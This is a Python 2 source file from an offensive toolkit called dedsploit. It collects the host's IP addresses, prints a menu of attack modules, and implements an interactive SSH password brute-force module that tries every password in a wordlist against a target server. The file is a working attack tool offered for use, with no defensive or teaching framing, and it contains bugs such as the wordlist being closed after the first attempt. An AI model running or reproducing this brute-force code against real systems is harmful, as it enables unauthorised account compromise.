##########################################
# MainLib.py - Main library for dedsploit
##########################################

import os, sys, nmap, threading, signal, socket, smtplib, logging, paramiko
logging. getLogger("scapy.runtime").setLevel(logging.ERROR)

from time import sleep
from getpass import getpass
from terminaltables import AsciiTable
from subprocess import call
from scapy.all import *
from scapy.error import Scapy_Exception

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
LR = '\033[1;31m' # light red
LG = '\033[1;32m' # light green
LO = '\033[1;33m' # light orange
LB = '\033[1;34m' # light blue
LP = '\033[1;35m' # light purple
LC = '\033[1;36m' # light cyan

##########################################
# Determine Public and Local IP address given to this machine.
# This is good for the user's convenience
##########################################

lan_ip = os.popen("ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'").read()
public_ip = os.popen("wget http://ipinfo.io/ip -qO -").read()
mac_address = os.popen("cat /sys/class/net/eth0/address").read()
gateway_ip = os.popen("/sbin/ip route | awk '/default/ { printf $3 }'").read()

##########################################
# Print help menu for users to show what attack options and commands are available
##########################################

def help_options():
    print C + "====================================================================== "
    print "|| Welcome to ex0ploit! Here are the available commands and modules || "
    print "======================================================================="
    print "|| System Commands Available:                                       ||"
    print "||------------------------------------------------------------------||"
    print "|| help             Display available commands and modules          ||"
    print "|| clear            Move the screen up to clear it                  ||"
    print "|| exit             Exit the program                                ||"
    print "|| back             Go back to previous command                     ||"
    print "||------------------------------------------------------------------||"
    print "|| There are currently " + G + "" + C + "                           ||"
    print "|| ssh                                                              ||"
    print "|| ftp                                                              ||"
    print "|| smtp                                                             ||"
    print "|| http                                                             ||"
    print "|| misc                                                             ||"
    print "======================================================================="

def ssh_connect(address, username, password, port, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("filename.log")

    try:
        ssh.connect(address, port=int(port), username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error, e:
        print R + "[!] Error: Connection Failed. [!]"
        code = 2

    ssh.close()
    return code

############
# Main bruteforce module
############


def sshBruteforce(address, username, wordlist, port):
    wordlist = open(wordlist, 'r')

    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(address, username, password, port)
            if response == 0:
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            elif response == 1:
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            elif response == 2:
                print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                exit()
        except Exception, e:
            print e
            pass
        wordlist.close()

def ssh():
    while True:
        table_data = [
            ["SSH Available Commands", ""],
            ["exit", "Exit the SSH attack module"],
            ["bruteforce", "Bruteforce SSH server"],
        ]
        table = AsciiTable(table_data)
        print table.table
        print LC + "Type 'list' to show all of available modules" + W
        try:
            ssh_options = raw_input(P + "ssh>> " + W )
            if ssh_options == "list":
                print table.table
            elif ssh_options == "exit":
                break
            elif ssh_options == "bruteforce":
                print "Required Options:"
                print "-----------------------------------------------"
                print "target <server>  | Set the target SSH server"
                print "port <number>    | Set SSH port"
                print "username <name>  | Set username"
                print "wordist </path>  | Path to wordlist"
                print "start bruteforce | Start the attack once everything is set"
                print "-----------------------------------------------"
                while True:
                    pre, sshbrute_options = raw_input(P + "ssh>>bruteforce>> " + W ).split()
                    if pre == "target":
                        ssh_target = sshbrute_options
                        print "Target => ", ssh_target
                        continue
                    elif pre == "port":
                        ssh_port = sshbrute_options
                        print "Port => ", ssh_port
                        continue
                    elif pre == "username":
                        ssh_username = sshbrute_options
                        print "Username => ", ssh_username
                        continue
                    elif pre == "wordlist":
                        wordlist = sshbrute_options
                        print "Wordlist => ", wordlist
                        continue
                    elif pre == "start":
                        sshBruteforce(ssh_target, ssh_username, wordlist, ssh_port)
            else:
                raise ValueError
                continue
        except ValueError:
            print R + "[!] Command not Recognized [!]" + W
            continue
